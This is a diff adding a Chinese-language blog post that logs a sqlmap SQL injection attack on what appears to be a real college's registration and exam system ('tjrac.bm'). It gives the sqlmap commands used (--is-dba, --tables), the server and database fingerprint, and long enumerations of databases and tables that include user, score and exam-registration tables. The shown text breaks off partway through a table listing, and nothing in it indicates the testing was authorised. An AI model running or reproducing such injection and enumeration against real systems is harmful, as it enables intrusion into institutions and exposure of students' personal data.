@@ -1,0 +1,1351 @@
+
+<!DOCTYPE HTML>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>sqlmap渗透bm系统过程 - K</title>
+	<meta name="author" content="K">
+
+	
+	<meta name="description" content="0x00渗透点 python sqlmap.py -r ~/Project/渗透tjrac.bm/bm_search_LunWen.txt --tables 0x01判断是否为dba python sqlmap.py -r ~/Project/渗透tjrac.bm/ &hellip;">
+	
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+	<link href="false" rel="alternate" title="K" type="application/atom+xml">
+	<link rel="canonical" href="">
+	<link href="/favicon.png" rel="shortcut icon">
+	<link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+	<!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+	<script async="true" src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
+	
+</head>
+
+
+<body>
+	<header id="header" class="inner"><h1><a href="/">K</a></h1>
+<nav id="K_select">
+	<div class="alignleft menu">
+		<a class="button">Category</a>
+		<div class="container"><ul class="main">
+		
+	
+<li><a href="/blog/categories/markdown">markdown</a></li>
+
+<li><a href="/blog/categories/data">data</a></li>
+
+<li><a href="/blog/categories/php">php</a></li>
+
+<li><a href="/blog/categories/svn">svn</a></li>
+
+<li><a href="/blog/categories/octopress">octopress</a></li>
+
+<li><a href="/blog/categories/mysql">mysql</a></li>
+
+<li><a href="/blog/categories/j2ee">j2ee</a></li>
+
+<li><a href="/blog/categories/mac">mac</a></li>
+
+<li><a href="/blog/categories/struts2">struts2</a></li>
+
+<li><a href="/blog/categories/android">android</a></li>
+
+<li><a href="/blog/categories/hack">hack</a></li>
+
+<li><a href="/blog/categories/design">design</a></li>
+
+<li><a href="/blog/categories/eclipse">eclipse</a></li>
+
+<li><a href="/blog/categories/readme">readme</a></li>
+
+<li><a href="/blog/categories/javascript">javascript</a></li>
+
+<li><a href="/blog/categories/arduino">arduino</a></li>
+
+<li><a href="/blog/categories/jquery">jquery</a></li>
+
+<li><a href="/blog/categories/bootstrap">bootstrap</a></li>
+
+<li><a href="/blog/categories/squild">squild</a></li>
+
+<li><a href="/blog/categories/question">question</a></li>
+
+<li><a href="/blog/categories/java">java</a></li>
+
+<li><a href="/blog/categories/sqlmap">sqlmap</a></li>
+
+<li><a href="/blog/categories/python">python</a></li>
+
+<li><a href="/blog/categories/git">git</a></li>
+
+<li><a href="/blog/categories/pr">pr</a></li>
+
+<li><a href="/blog/categories/linux">linux</a></li>
+
+<li><a href="/blog/categories/oracle">oracle</a></li>
+
+<li><a href="/blog/categories/windows">windows</a></li>
+
+<li><a href="/blog/categories/video">video</a></li>
+
+<li><a href="/blog/categories/travel">travel</a></li>
+
+<li><a href="/blog/categories/web">web</a></li>
+
+<li><a href="/blog/categories/httracl">httracl</a></li>
+
+<li><a href="/blog/categories/httpclient">httpclient</a></li>
+
+<li><a href="/blog/categories/sql">sql</a></li>
+
+<li><a href="/blog/categories/photoshop">photoshop</a></li>
+
+</ul>
+</div>
+	</div>
+	<div class="alignright search">
+		<a class="button"></a>
+		<div class="container">
+			<form action="https://www.google.com/search" method="get">
+				<input type="text" name="q" results="0">
+				<input type="hidden" name="q" value="site:mzkmzk.github.io">
+			</form>
+		</div>
+	</div>
+</nav>
+<nav id="main-nav">
+	<ul class="main">
+		
+	
+
+
+</ul>
+
+	</nav>
+<nav id="mobile-nav">
+	<div class="alignleft menu">
+		<a class="button">Category</a>
+		<div class="container"><ul class="main">
+		
+	
+<li><a href="/blog/categories/markdown">markdown</a></li>
+
+<li><a href="/blog/categories/data">data</a></li>
+
+<li><a href="/blog/categories/php">php</a></li>
+
+<li><a href="/blog/categories/svn">svn</a></li>
+
+<li><a href="/blog/categories/octopress">octopress</a></li>
+
+<li><a href="/blog/categories/mysql">mysql</a></li>
+
+<li><a href="/blog/categories/j2ee">j2ee</a></li>
+
+<li><a href="/blog/categories/mac">mac</a></li>
+
+<li><a href="/blog/categories/struts2">struts2</a></li>
+
+<li><a href="/blog/categories/android">android</a></li>
+
+<li><a href="/blog/categories/hack">hack</a></li>
+
+<li><a href="/blog/categories/design">design</a></li>
+
+<li><a href="/blog/categories/eclipse">eclipse</a></li>
+
+<li><a href="/blog/categories/readme">readme</a></li>
+
+<li><a href="/blog/categories/javascript">javascript</a></li>
+
+<li><a href="/blog/categories/arduino">arduino</a></li>
+
+<li><a href="/blog/categories/jquery">jquery</a></li>
+
+<li><a href="/blog/categories/bootstrap">bootstrap</a></li>
+
+<li><a href="/blog/categories/squild">squild</a></li>
+
+<li><a href="/blog/categories/question">question</a></li>
+
+<li><a href="/blog/categories/java">java</a></li>
+
+<li><a href="/blog/categories/sqlmap">sqlmap</a></li>
+
+<li><a href="/blog/categories/python">python</a></li>
+
+<li><a href="/blog/categories/git">git</a></li>
+
+<li><a href="/blog/categories/pr">pr</a></li>
+
+<li><a href="/blog/categories/linux">linux</a></li>
+
+<li><a href="/blog/categories/oracle">oracle</a></li>
+
+<li><a href="/blog/categories/windows">windows</a></li>
+
+<li><a href="/blog/categories/video">video</a></li>
+
+<li><a href="/blog/categories/travel">travel</a></li>
+
+<li><a href="/blog/categories/web">web</a></li>
+
+<li><a href="/blog/categories/httracl">httracl</a></li>
+
+<li><a href="/blog/categories/httpclient">httpclient</a></li>
+
+<li><a href="/blog/categories/sql">sql</a></li>
+
+<li><a href="/blog/categories/photoshop">photoshop</a></li>
+
+</ul>
+</div>
+	</div>
+	<div class="alignright search">
+		<a class="button"></a>
+		<div class="container">
+			<form action="https://www.google.com/search" method="get">
+				<input type="text" name="q" results="0">
+				<input type="hidden" name="q" value="site:mzkmzk.github.io">
+			</form>
+		</div>
+	</div>
+</nav>
+<nav id="sub-nav" class="alignright">
+	<div class="social">
+		
+		
+		
+		
+    
+		
+		
+		
+		
+		
+    
+	</div>
+	
+</nav>
+
+</header>
+	
+		
+	
+	<div id="content" class="inner"><article class="post">
+	<h2 class="title">Sqlmap渗透bm系统过程</h2>
+	<div class="entry-content"><!--more-->
+
+
+<h3>0x00渗透点</h3>
+
+<pre><code>python sqlmap.py -r ~/Project/渗透tjrac.bm/bm_search_LunWen.txt  --tables 
+</code></pre>
+
+<h3>0x01判断是否为dba</h3>
+
+<pre><code> python sqlmap.py -r ~/Project/渗透tjrac.bm/bm_search_LunWen.txt  --is-dba
+</code></pre>
+
+<p>得到的结果是false</p>
+
+<p>得到了其他信息</p>
+
+<pre><code>web server operating system: Windows 2003 or XP
+web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 1.1.4322
+back-end DBMS: Microsoft SQL Server 2000
+</code></pre>
+
+<h3>0x02获取数据库表</h3>
+
+<pre><code>python sqlmap.py -r ~/Project/渗透tjrac.bm/bm_search_LunWen.txt  --tables 
+</code></pre>
+
+<p>得到</p>
+
+<p>Database: RCY                                                                <br/>
+[4 tables]
++&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
+| dtproperties                                |
+| rcy_users                                   |
+| sysconstraints                              |
+| syssegments                                 |
++&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>
+
+<p>Database: paperzh
+[64 tables]
++&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
+| B_AcademicTitle                             |
+| B_CopyRight                                 |
+| B_DepName                                   |
+| B_Power                                     |
+| Dic_Table                                   |
+| Paper_ItemList                              |
+| Paper_KtReport_Save                         |
+| Paper_KtReport_Save                         |
+| Paper_Notes_Save                            |
+| Paper_Notes_Save                            |
+| Paper_Power                                 |
+| Paper_Rws_Save                              |
+| Paper_Rws_Save                              |
+| Paper_SelectReason_Save                     |
+| Paper_SelectReason_Save                     |
+| Paper_SelectSubject_Save                    |
+| Paper_SelectSubject_Save                    |
+| Paper_Setting                               |
+| Paper_Source                                |
+| Paper_Students_Save                         |
+| Paper_Students_pre                          |
+| Paper_Students_pre                          |
+| Paper_Subject_Save                          |
+| Paper_Subject_Save                          |
+| Paper_TeachPlace                            |
+| Paper_ZqCheck_Save                          |
+| Paper_ZqCheck_Save                          |
+| Paper_Ztf                                   |
+| Paper_users                                 |
+| paper_backup                                |
+| sysconstraints                              |
+| syssegments                                 |
+| vUsers                                      |
+| v_paper_backuppre                           |
+| v_paper_datasave                            |
+| v_paper_ktreport_sum                        |
+| v_paper_ktreport_sum                        |
+| v_paper_rws_sum                             |
+| v_paper_rws_sum                             |
+| v_paper_rwsex                               |
+| v_paper_selectreason_sum                    |
+| v_paper_selectreason_sum                    |
+| v_paper_selectsubject_sum                   |
+| v_paper_selectsubject_sum                   |
+| v_paper_stat_all                            |
+| v_paper_stat_cg                             |
+| v_paper_stat_kt                             |
+| v_paper_stat_notes                          |
+| v_paper_stat_rws                            |
+| v_paper_stat_selreason                      |
+| v_paper_stat_sum                            |
+| v_paper_stat_teacher                        |
+| v_paper_stat_zqcheck                        |
+| v_paper_students                            |
+| v_paper_subject_sum                         |
+| v_paper_subject_sum                         |
+| v_paper_task                                |
+| v_paper_upload_sum                          |
+| v_paper_upload_sum                          |
+| v_paper_users                               |
+| v_paper_zg1_sum                             |
+| v_paper_zg2_sum                             |
+| v_paper_zqcheck_sum                         |
+| v_paper_zqcheck_sum                         |
++&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>
+
+<p>Database: homepage
+[22 tables]
++&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
+| B_DepName                                   |
+| B_School985                                 |
+| b_School211                                 |
+| dtproperties                                |
+| homepage_announce                           |
+| homepage_files                              |
+| homepage_graduate                           |
+| homepage_link                               |
+| homepage_navitem                            |
+| homepage_navitem                            |
+| homepage_news                               |
+| homepage_power                              |
+| homepage_recuritment                        |
+| homepage_roleitemurl                        |
+| homepage_roleitemurl                        |
+| homepage_rolerank                           |
+| homepage_specialty                          |
+| homepage_users                              |
+| sysconstraints                              |
+| syssegments                                 |
+| v_homepage_nav                              |
+| v_homepage_roleurl                          |
++&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>
+
+<p>Database: BookMaterialzhengli
+[91 tables]
++&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
+| dtproperties                                |
+| sysconstraints                              |
+| syssegments                                 |
+| 专业表                                         |
+| 专业视图                                        |
+| 供书单位表                                       |
+| 供书单位退书表                                     |
+| 供书单位退书详情表                                   |
+| 供书单位退书详情视图                                  |
+| 供货商退书临时表                                    |
+| 供货商退书查询视图                                   |
+| 入库临时表                                       |
+| 入库查询视图                                      |
+| 入库表                                         |
+| 入库详情表                                       |
+| 入库详情视图                                      |
+| 出库临时表                                       |
+| 出库查询视图                                      |
+| 出库表                                         |
+| 出库详情表                                       |
+| 出库详情视图                                      |
+| 出版社表                                        |
+| 初始化表                                        |
+| 学生退书临时表                                     |
+| 学生退书查询视图                                    |
+| 学生退书表                                       |
+| 学生退书详情表                                     |
+| 学生退书详情视图                                    |
+| 学院表                                         |
+| 对外订购表                                       |
+| 对外订购详情表                                     |
+| 库存表                                         |
+| 报废查询视图                                      |
+| 报废表                                         |
+| 报废详情表                                       |
+| 报废详情视图                                      |
+| 教师教材订购表                                     |
+| 教师教材订购详情表                                   |
+| 教师退书查询视图                                    |
+| 教师退书表                                       |
+| 教师退书详情表                                     |
+| 教师退书详情视图                                    |
+| 教师领书成本视图                                    |
+| 教师领书查询视图                                    |
+| 教师领书表                                       |
+| 教师领书详情表                                     |
+| 教师领书详情视图                                    |
+| 教师领书退书查询视图                                  |
+| 教材临时预订表                                     |
+| 教材出库日统计表                                    |
+| 教材出库统计表                                     |
+| 教材基本情况表1                                           |
+| 教材基本情况表1                                           |
+| 教材基本情况视图                                    |
+| 教材跟踪查询视图                                    |
+| 有书教材基本情况视图                                  |
+| 班级表                                         |
+| 班级视图                                        |
+| 班级订书全视图                                     |
+| 班级订书统计简单视图                                  |
+| 班级订书表                                       |
+| 班级订书详情总视图                                   |
+| 班级订书详情表                                     |
+| 班级退书查询视图                                    |
+| 班级退书表                                       |
+| 班级退书详情表                                     |
+| 班级退书详情视图                                    |
+| 班级领书成本视图                                    |
+| 班级领书未结算视图                                   |
+| 班级领书查询视图                                    |
+| 班级领书模板班级表                                   |
+| 班级领书模板表                                     |
+| 班级领书模板视图                                    |
+| 班级领书表                                       |
+| 班级领书详情表                                     |
+| 班级领书详情视图                                    |
+| 班级领书退书查询视图                                  |
+| 用户表                                         |
+| 盘点表                                         |
+| 盘点详情查询视图                                    |
+| 盘点详情表                                       |
+| 盘点详情视图                                      |
+| 结算表                                         |
+| 销售临时表                                       |
+| 销售成本视图                                      |
+| 销售查询视图                                      |
+| 销售表                                         |
+| 销售详情表                                       |
+| 销售详情视图1                                           |
+| 销售详情视图1                                           |
+| 项目设置表                                       |
++&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>
+
+<p>Database: tjrac
+[291 tables]
++&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
+| Accident_List                               |
+| App_Log                                     |
+| App_PaperLib                                |
+| B_CopyRight                                 |
+| B_DepName                                   |
+| B_ItemList                                  |
+| B_MZ                                        |
+| B_NewsType                                  |
+| B_Pay                                       |
+| B_Power                                     |
+| B_Province                                  |
+| B_StudentsAll                               |
+| B_TitleLink                                 |
+| B_XnXq                                      |
+| B_attendtype                                |
+| B_users                                     |
+| Books_Cet46User                             |
+| Books_Cet46_Save                            |
+| Books_ClassRoom_Print                       |
+| Books_ClassRoom_Print                       |
+| Books_List_Save                             |
+| Books_List_Save                             |
+| Books_Zyxxk                                 |
+| Books_ZyxxkStu                              |
+| Books_cetyyjb                               |
+| CJK12                                       |
+| CWC_CardID                                  |
+| ClassRoom_PreOrder                          |
+| ClassRoom_Type                              |
+| Contract_List                               |
+| Contract_Pay                                |
+| Course_Book_del                             |
+| Course_Book_del                             |
+| Course_EnableStus                           |
+| Course_Setting                              |
+| Device_ComputerModel                        |
+| Device_ComputerModel                        |
+| Device_Furniture                            |
+| Device_KeyLend                              |
+| Device_KeyManager                           |
+| Device_List                                 |
+| Device_ModifyHis                            |
+| Device_NoUse                                |
+| Device_Repair                               |
+| Device_Type                                 |
+| Dic_Table                                   |
+| Dm_List                                     |
+| Dm_Users                                    |
+| Exam_Breachinfo                             |
+| Exam_Classroom                              |
+| Exam_ExamLib                                |
+| Exam_OnlineData                             |
+| Exam_PaperJunxun2                           |
+| Exam_PaperJunxun2                           |
+| Exam_PaperLib_Save                          |
+| Exam_PaperLib_Save                          |
+| Exam_PaperPsychology_Save                   |
+| Exam_PaperPsychology_Save                   |
+| Exam_PaperSafe                              |
+| Exam_PaperTiYubak                           |
+| Exam_PaperTiYubak                           |
+| Exam_QuestionLib                            |
+| Exam_Score_Save                             |
+| Exam_Score_Save                             |
+| Exam_Students                               |
+| Exam_TestType                               |
+| Lab_Category                                |
+| Lab_Education                               |
+| Lab_ExpertType                              |
+| Lab_Item                                    |
+| Lab_NationCode                              |
+| Lab_ProTechRank                             |
+| Lab_Require                                 |
+| Lab_RoomCategory                            |
+| Lab_RoomName                                |
+| Lab_RoomType                                |
+| Lab_SJ12009                                 |
+| Lab_SJ12010                                 |
+| Lab_SJ1_Save                                |
+| Lab_SJ1_Save                                |
+| Lab_SJ1bak                                  |
+| Lab_SJ2_Save                                |
+| Lab_SJ2_Save                                |
+| Lab_SJ3_Save                                |
+| Lab_SJ3_Save                                |
+| Lab_SJ4_Save                                |
+| Lab_SJ4_Save                                |
+| Lab_SJ5_Save                                |
+| Lab_SJ5_Save                                |
+| Lab_SJ61                                    |
+| Lab_SJ6_Save                                |
+| Lab_SJ6_Save                                |
+| Lab_SJ7_Save                                |
+| Lab_SJ7_Save                                |
+| Lab_Sex                                     |
+| Lab_StudentType                             |
+| Lab_Subject                                 |
+| Lab_Type                                    |
+| Merge_Score1_2031                           |
+| Merge_Score1_2061                           |
+| Merge_Score1_2063                           |
+| Merge_Score1_501                            |
+| Merge_Score1_502                            |
+| Merge_Score2_2031                           |
+| Merge_Score2_2061                           |
+| Merge_Score2_2063                           |
+| Merge_Score2_501                            |
+| Merge_Score2_502                            |
+| News_Push                                   |
+| OA_AdminUser                                |
+| OA_JwcNews                                  |
+| OA_JwcNotes                                 |
+| OA_Phone                                    |
+| OA_Teachers                                 |
+| Paper_KtReport                              |
+| Paper_Notes_Save                            |
+| Paper_Notes_Save                            |
+| Paper_Power                                 |
+| Paper_SelectSubject_Save                    |
+| Paper_SelectSubject_Save                    |
+| Paper_Setting                               |
+| Paper_Students_Save                         |
+| Paper_Students_Save                         |
+| Paper_Subject_Save                          |
+| Paper_Subject_Save                          |
+| Paper_Ztf                                   |
+| Paper_users                                 |
+| Seat_ChangeExaminer_Save                    |
+| Seat_ChangeExaminer_Save                    |
+| Seat_ClassRoom                              |
+| Seat_CourseLib6_28                          |
+| Seat_CourseLibPre                           |
+| Seat_CourseLib_Del                          |
+| Seat_CourseLib_Del                          |
+| Seat_CourseLib_Save                         |
+| Seat_Datalib6_28                            |
+| Seat_DatalibPre                             |
+| Seat_Datalib_Save                           |
+| Seat_Datalib_Save                           |
+| Seat_Datalibselect                          |
+| Seat_ExamTime                               |
+| Seat_ExamType                               |
+| Seat_Jxrwb                                  |
+| Seat_Xsxkb                                  |
+| VIEWExport                                  |
+| Video_List                                  |
+| ZSB_BM                                      |
+| allstu2014                                  |
+| books_ClassRoom_Save                        |
+| books_cet46_2011_12                         |
+| books_cet46_2011_12                         |
+| books_cet46_md5                             |
+| books_cet4score                             |
+| con06                                       |
+| con0708                                     |
+| con09                                       |
+| con10                                       |
+| con11                                       |
+| conzb                                       |
+| djksDragon_BM                               |
+| dm_userloginhis                             |
+| dtproperties                                |
+| exam_NonSchoolStu                           |
+| exam_junxunstu                              |
+| exam_paperby                                |
+| exam_paperparty_save                        |
+| exam_paperparty_save                        |
+| exam_stu20146                               |
+| exam_tiyuenew                               |
+| exam_tiyustudent2012                        |
+| labcenter_announce                          |
+| labcenter_book                              |
+| labcenter_intro                             |
+| labcenter_lab                               |
+| labcenter_navitems                          |
+| labcenter_news                              |
+| labcenter_openitem                          |
+| seat_datalibupdatehis                       |
+| sysconstraints                              |
+| syssegments                                 |
+| t_ks                                        |
+| temp132qk                                   |
+| temp142_kf                                  |
+| temp142cet46                                |
+| temp142score                                |
+| temp142userdel                              |
+| temp20131tiyu                               |
+| temp20132014_1_xinli                        |
+| temp20141212                                |
+| temp20141216                                |
+| temp20141219                                |
+| temp20141222                                |
+| temp20141223_fdy                            |
+| temp20141224_fdy                            |
+| temp2014_11_28                              |
+| temp_1bqx                                   |
+| temp_2015junxun                             |
+| temp_cet46927                               |
+| temp_choucha                                |
+| temp_djksjf                                 |
+| temp_lab_sj4                                |
+| temp_ncre40jf                               |
+| temp_nopay108                               |
+| temp_paperxlx                               |
+| temp_party_students                         |
+| temp_teacher                                |
+| temp_tiyu2014                               |
+| temp_tiyu2014                               |
+| temp_tiyuestu14151                          |
+| temp_tiyuuser2014                           |
+| temp_xlstu                                  |
+| temp_xxds                                   |
+| temp_y2ks                                   |
+| temp_y4                                     |
+| tempcet412                                  |
+| tempcet413                                  |
+| tempcet46_142                               |
+| tempcet46_151_md                            |
+| tempcet46bmh                                |
+| tempcet46qk                                 |
+| tempcet46score2014                          |
+| tempcet46userqx                             |
+| tempcet4no                                  |
+| tempcet4score                               |
+| tempcet6qxmd                                |
+| tempcet_ks                                  |
+| tempcetnoply                                |
+| tempcourselib1                              |
+| tempcourselib1                              |
+| tempe1e3                                    |
+| tempe1md                                    |
+| tempe3md                                    |
+| tempe3qx                                    |
+| tempgl                                      |
+| tempjf01                                    |
+| tempjf01                                    |
+| tempjunxunbk                                |
+| temptiyustu                                 |
+| tempttt                                     |
+| tempuser                                    |
+| tempwxl                                     |
+| vSeat_Courselib_save                        |
+| vSeat_Courselib_save                        |
+| vUsers                                      |
+| v_ClassRoom_Noon                            |
+| v_ClassRoom_Normal                          |
+| v_Lab_SJ1                                   |
+| v_Lab_SJ5                                   |
+| v_Lab_SJ6                                   |
+| v_Lab_Sj4                                   |
+| v_Lab_item                                  |
+| v_Seat_ChangeExaminer_Save                  |
+| v_Seat_ChangeExaminer_Save                  |
+| v_books_zyxxk                               |
+| v_books_zyxxkstu                            |
+| v_cet46_stuinfook                           |
+| v_cet46book_list_save                       |
+| v_cet46book_list_save                       |
+| v_dm_list_history                           |
+| v_dm_list_history                           |
+| v_dm_list_sum                               |
+| v_dm_queryall                               |
+| v_dm_queryall                               |
+| v_dm_querysubject                           |
+| v_dm_stu_sum                                |
+| v_exam_breachinfo                           |
+| v_exam_breachstats                          |
+| v_exam_score                                |
+| v_exam_teachcount                           |
+| v_lab_roomname                              |
+| v_oa_teachers                               |
+| v_seat_classroomrepeat                      |
+| v_seat_courselib_save                       |
+| v_seat_courselibimport                      |
+| v_seat_datalib_save                         |
+| v_seat_datalib_save                         |
+| v_seat_examlist                             |
+| v_seat_querydatalib                         |
+| v_seat_studentrepeat                        |
+| v_seat_xsxkb_stucount                       |
+| v_seat_xsxkb_stucount                       |
+| v_users                                     |
+| vbooks_List_Save                            |
+| vbooks_cet46_Save                           |
+| viewExamData                                |
+| viewScoreDataHis                            |
+| viewScoreDataHis                            |
+| viewSelectSubject                           |
+| viewShowCet46Info                           |
+| viewSumbooks                                |
+| viewbookslist                               |
++&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>
+
+<p>Database: CET46
+[384 tables]
++&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
+| CollegeForeignLanguageTest072.a_bj          |
+| CollegeForeignLanguageTest072.a_xy          |
+| CollegeForeignLanguageTest072.a_zy          |
+| CollegeForeignLanguageTest072.b_kkyyjb      |
+| CollegeForeignLanguageTest072.bp_jd         |
+| CollegeForeignLanguageTest072.d_accept      |
+| CollegeForeignLanguageTest072.t_ks_modify   |
+| CollegeForeignLanguageTest072.t_ks_modify   |
+| CollegeForeignLanguageTest072.v_bmcount2_sd |
+| CollegeForeignLanguageTest072.v_bmcount2_sd |
+| CollegeForeignLanguageTest072.v_bmcount_sd  |
+| CollegeForeignLanguageTest072.v_bmcount_sd  |
+| CollegeForeignLanguageTest072.v_bpcount2_sd |
+| CollegeForeignLanguageTest072.v_bpcount2_sd |
+| CollegeForeignLanguageTest072.v_bpcount_sd  |
+| CollegeForeignLanguageTest072.v_bpcount_sd  |
+| CollegeForeignLanguageTest072.v_jtbm_sd     |
+| CollegeForeignLanguageTest072.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest072.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest072.v_ks_sd       |
+| CollegeForeignLanguageTest072.v_tj_bkrs     |
+| CollegeForeignLanguageTest072.v_yyjb_sd     |
+| CollegeForeignLanguageTest081.a_bj          |
+| CollegeForeignLanguageTest081.a_xy          |
+| CollegeForeignLanguageTest081.a_zy          |
+| CollegeForeignLanguageTest081.b_kkyyjb      |
+| CollegeForeignLanguageTest081.bp_jd         |
+| CollegeForeignLanguageTest081.d_accept      |
+| CollegeForeignLanguageTest081.t_ks_modify   |
+| CollegeForeignLanguageTest081.t_ks_modify   |
+| CollegeForeignLanguageTest081.v_bmcount2_sd |
+| CollegeForeignLanguageTest081.v_bmcount2_sd |
+| CollegeForeignLanguageTest081.v_bmcount_sd  |
+| CollegeForeignLanguageTest081.v_bmcount_sd  |
+| CollegeForeignLanguageTest081.v_bpcount2_sd |
+| CollegeForeignLanguageTest081.v_bpcount2_sd |
+| CollegeForeignLanguageTest081.v_bpcount_sd  |
+| CollegeForeignLanguageTest081.v_bpcount_sd  |
+| CollegeForeignLanguageTest081.v_jtbm_sd     |
+| CollegeForeignLanguageTest081.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest081.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest081.v_ks_sd       |
+| CollegeForeignLanguageTest081.v_tj_bkrs     |
+| CollegeForeignLanguageTest081.v_yyjb_sd     |
+| CollegeForeignLanguageTest082.a_bj          |
+| CollegeForeignLanguageTest082.a_xy          |
+| CollegeForeignLanguageTest082.a_zy          |
+| CollegeForeignLanguageTest082.b_kkyyjb      |
+| CollegeForeignLanguageTest082.bp_jd         |
+| CollegeForeignLanguageTest082.d_accept      |
+| CollegeForeignLanguageTest082.t_ks_modify   |
+| CollegeForeignLanguageTest082.t_ks_modify   |
+| CollegeForeignLanguageTest082.v_bmcount2_sd |
+| CollegeForeignLanguageTest082.v_bmcount2_sd |
+| CollegeForeignLanguageTest082.v_bmcount_sd  |
+| CollegeForeignLanguageTest082.v_bmcount_sd  |
+| CollegeForeignLanguageTest082.v_bpcount2_sd |
+| CollegeForeignLanguageTest082.v_bpcount2_sd |
+| CollegeForeignLanguageTest082.v_bpcount_sd  |
+| CollegeForeignLanguageTest082.v_bpcount_sd  |
+| CollegeForeignLanguageTest082.v_jtbm_sd     |
+| CollegeForeignLanguageTest082.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest082.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest082.v_ks_sd       |
+| CollegeForeignLanguageTest082.v_tj_bkrs     |
+| CollegeForeignLanguageTest082.v_yyjb_sd     |
+| CollegeForeignLanguageTest091.a_bj          |
+| CollegeForeignLanguageTest091.a_xy          |
+| CollegeForeignLanguageTest091.a_zy          |
+| CollegeForeignLanguageTest091.b_kkyyjb      |
+| CollegeForeignLanguageTest091.bp_jd         |
+| CollegeForeignLanguageTest091.d_accept      |
+| CollegeForeignLanguageTest091.t_ks_modify   |
+| CollegeForeignLanguageTest091.t_ks_modify   |
+| CollegeForeignLanguageTest091.v_bmcount2_sd |
+| CollegeForeignLanguageTest091.v_bmcount2_sd |
+| CollegeForeignLanguageTest091.v_bmcount_sd  |
+| CollegeForeignLanguageTest091.v_bmcount_sd  |
+| CollegeForeignLanguageTest091.v_bpcount2_sd |
+| CollegeForeignLanguageTest091.v_bpcount2_sd |
+| CollegeForeignLanguageTest091.v_bpcount_sd  |
+| CollegeForeignLanguageTest091.v_bpcount_sd  |
+| CollegeForeignLanguageTest091.v_jtbm_sd     |
+| CollegeForeignLanguageTest091.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest091.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest091.v_ks_sd       |
+| CollegeForeignLanguageTest091.v_tj_bkrs     |
+| CollegeForeignLanguageTest091.v_yyjb_sd     |
+| CollegeForeignLanguageTest092.a_bj          |
+| CollegeForeignLanguageTest092.a_xy          |
+| CollegeForeignLanguageTest092.a_zy          |
+| CollegeForeignLanguageTest092.b_kkyyjb      |
+| CollegeForeignLanguageTest092.bp_jd         |
+| CollegeForeignLanguageTest092.d_accept      |
+| CollegeForeignLanguageTest092.t_ks_modify   |
+| CollegeForeignLanguageTest092.t_ks_modify   |
+| CollegeForeignLanguageTest092.v_bmcount2_sd |
+| CollegeForeignLanguageTest092.v_bmcount2_sd |
+| CollegeForeignLanguageTest092.v_bmcount_sd  |
+| CollegeForeignLanguageTest092.v_bmcount_sd  |
+| CollegeForeignLanguageTest092.v_bpcount2_sd |
+| CollegeForeignLanguageTest092.v_bpcount2_sd |
+| CollegeForeignLanguageTest092.v_bpcount_sd  |
+| CollegeForeignLanguageTest092.v_bpcount_sd  |
+| CollegeForeignLanguageTest092.v_jtbm_sd     |
+| CollegeForeignLanguageTest092.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest092.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest092.v_ks_sd       |
+| CollegeForeignLanguageTest092.v_tj_bkrs     |
+| CollegeForeignLanguageTest092.v_yyjb_sd     |
+| CollegeForeignLanguageTest101.a_bj          |
+| CollegeForeignLanguageTest101.a_xy          |
+| CollegeForeignLanguageTest101.a_zy          |
+| CollegeForeignLanguageTest101.b_kkyyjb      |
+| CollegeForeignLanguageTest101.bp_jd         |
+| CollegeForeignLanguageTest101.d_accept      |
+| CollegeForeignLanguageTest101.t_ks_modify   |
+| CollegeForeignLanguageTest101.t_ks_modify   |
+| CollegeForeignLanguageTest101.v_bmcount2_sd |
+| CollegeForeignLanguageTest101.v_bmcount2_sd |
+| CollegeForeignLanguageTest101.v_bmcount_sd  |
+| CollegeForeignLanguageTest101.v_bmcount_sd  |
+| CollegeForeignLanguageTest101.v_bpcount2_sd |
+| CollegeForeignLanguageTest101.v_bpcount2_sd |
+| CollegeForeignLanguageTest101.v_bpcount_sd  |
+| CollegeForeignLanguageTest101.v_bpcount_sd  |
+| CollegeForeignLanguageTest101.v_jtbm_sd     |
+| CollegeForeignLanguageTest101.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest101.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest101.v_ks_sd       |
+| CollegeForeignLanguageTest101.v_tj_bkrs     |
+| CollegeForeignLanguageTest101.v_yyjb_sd     |
